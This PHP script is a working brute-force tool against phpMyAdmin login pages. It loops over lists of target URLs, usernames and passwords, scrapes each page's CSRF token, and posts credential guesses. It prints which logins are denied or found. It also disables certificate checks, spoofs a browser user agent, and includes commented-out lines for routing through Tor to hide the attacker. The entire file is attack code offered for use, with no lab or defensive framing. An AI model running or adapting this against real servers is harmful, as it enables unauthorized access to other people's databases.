<?php

require(__DIR__.'/inc/functions.php');

//Target
$target = file(__DIR__.'/inc/target.txt', FILE_IGNORE_NEW_LINES);

//pma username
$username_list = file(__DIR__.'/inc/username.txt', FILE_IGNORE_NEW_LINES);

//pma password
$password_list = file(__DIR__.'/inc/password.txt', FILE_IGNORE_NEW_LINES);


    foreach($username_list as $pma_username) {


        foreach($target as $url) {

            //Detect the phpMyAdmin version
            $version = pma_version($url);

            //Fail to match, go to the net target
            if($version === NULL) {
                echo "------------------\nTarget : $url \nFailed to match with a phpMyAdmin root webdirectory\n------------------\n";
                continue;
            }

            //Success matching
            echo "------------------------------------\nTarget : $url\nVersion : $version\nStarting bruteforce... \n\n";

            foreach($password_list as $value) {

        	   $curl = curl_init();
                       curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
                       curl_setopt($curl, CURLOPT_URL, $url);
                       curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
                       curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                       curl_setopt($curl, CURLOPT_COOKIEFILE, __DIR__.'/cookie.txt');
                       curl_setopt($curl, CURLOPT_COOKIEJAR, __DIR__.'/cookie.txt');
                       curl_setopt($curl, CURLOPT_TIMEOUT, 15);
                       curl_setopt($curl, CURLOPT_HTTPGET, 1);
                       curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
                       curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
                    // Want to use it by TOR ? Uncomment those 2 following lines.
                    //curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:9050');
                    //curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);


        	  $parse = curl_exec($curl);

        	   //Token
        	  preg_match('/name\=\"token\" value\=\"(.*?)\"/', $parse, $ext);
              $token = $ext[1];

              $curl = curl_init();
                      curl_setopt($curl, CURLOPT_USERAGENT,'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13');
                      curl_setopt($curl, CURLOPT_URL, $url);
                      curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, 0);
                      curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
                      curl_setopt($curl, CURLOPT_COOKIEFILE, __DIR__.'/cookie.txt');
                      curl_setopt($curl, CURLOPT_COOKIEJAR, __DIR__.'/cookie.txt');
                      curl_setopt($curl, CURLOPT_TIMEOUT, 15);
                      curl_setopt($curl, CURLOPT_HTTPGET, 1);
                      curl_setopt($curl, CURLOPT_RETURNTRANSFER, TRUE);
                      curl_setopt($curl, CURLOPT_FOLLOWLOCATION, 1);
                    // Want to use it by TOR ? Uncomment those 2 following lines.
                    //curl_setopt($curl, CURLOPT_PROXY, '127.0.0.1:9050');
                    //curl_setopt($curl, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5);
                      curl_setopt($curl, CURLOPT_POST, 1);
                      curl_setopt($curl, CURLOPT_POSTFIELDS, 'pma_username='.$pma_username.'&pma_password='.$value.'&server=1&target=index.php&lang=en&collation_connection=utf8_unicode_ci&token='.$token.'');

               $parse = curl_exec($curl);

               //If the server return a 500 ERROR or something unexpected, we switch to the next target
               //Chiness pma is not yet supported, if the preg_match found a chiness chars, it will be considerer has failed
               if(empty($parse) || $parse === NULL || preg_match("/\p{Han}+/u", $parse)) {
                   echo "\nThe target $url has failed to correctly answer... Switch to the next target\n------------------------------------\n";
                   break;
               }

               //Password failed
               elseif(preg_match("/\<div class\=\"error\"\>/", $parse)) {
                   echo "$url - $pma_username:$value denied\n";
               }

               //Passwaord match
               // /!\ It could be a false positive, the script is not stable yet
               else {
                   echo "$url - $pma_username:$value Found !\n";
                   exit;
                 }

            }
        }
    }
?>
